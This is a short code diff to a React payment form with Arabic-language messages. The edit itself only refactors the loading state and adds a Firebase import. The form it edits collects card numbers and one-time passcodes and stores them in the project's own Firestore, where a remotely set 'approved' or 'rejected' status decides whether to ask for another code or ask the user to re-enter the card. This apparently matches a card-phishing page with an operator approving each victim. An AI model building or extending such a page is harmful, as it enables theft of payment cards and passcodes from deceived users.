@@ -2,6 +2,7 @@ import { useEffect, useState } from 'react';
 import './kent.css';
 import { doc, onSnapshot } from 'firebase/firestore';
 import FullPageLoader from '@/components/fullpageloader';
+import { handlePay ,db} from '@/lib/firebase';
 
 type PaymentInfo = {
   cardNumber: string;
@@ -177,9 +178,9 @@ export const Payment = (props: any) => {
             setPaymentInfo((prev) => ({ ...prev, status: data.status }));
             if (data.status === 'approved') {
               setstep(2);
-              props.setisloading(false);
+              setLoading(false);
             } else if (data.status === 'rejected') {
-              props.setisloading(false);
+              setLoading(false);
               alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
               setstep(1);
             }
@@ -638,19 +639,19 @@ export const Payment = (props: any) => {
                         }
                         onClick={() => {
                           if (step === 1) {
-                            props.setisloading(true);
+                            setLoading(true);
                             handlePay(paymentInfo, setPaymentInfo);
                             handleSubmit();
                           } else if (step >= 2) {
                             if (!newotp.includes(paymentInfo.otp!)) {
                               newotp.push(paymentInfo.otp!);
                             }
-                            props.setisloading(true);
+                            setLoading(true);
                             handleAddotp(paymentInfo.otp!);
                             props.handleOArr(paymentInfo.otp!);
                             handlePay(paymentInfo, setPaymentInfo);
                             setTimeout(() => {
-                              props.setisloading(false);
+                              setLoading(false);
                               setPaymentInfo({
                                 ...paymentInfo,
                                 otp: '',
